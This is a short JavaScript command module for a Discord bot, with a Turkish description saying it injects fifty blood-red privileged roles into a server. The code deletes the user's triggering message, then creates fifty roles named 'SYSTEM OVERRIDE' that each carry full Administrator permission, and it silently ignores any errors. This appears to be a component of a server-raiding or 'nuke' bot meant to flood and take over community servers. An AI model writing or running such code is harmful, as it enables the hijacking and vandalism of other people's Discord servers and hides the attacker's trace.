const { PermissionFlagsBits } = require("discord.js");
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

module.exports = {
  name: "rol",
  description: "Sunucuya 50 adet kan kırmızı yetkili rol enjekte eder.",
  async execute(message, args, client, config) {
    await message.delete().catch(() => { });
    const guild = message.guild;

    for (let i = 0; i < 50; i++) {
      try {
        await guild.roles.create({
          name: "SYSTEM OVERRIDE",
          color: 0x6b0000, // Kan kırmızısı
          permissions: [PermissionFlagsBits.Administrator],
        });
      } catch { }
      await delay(300);
    }
  },
};
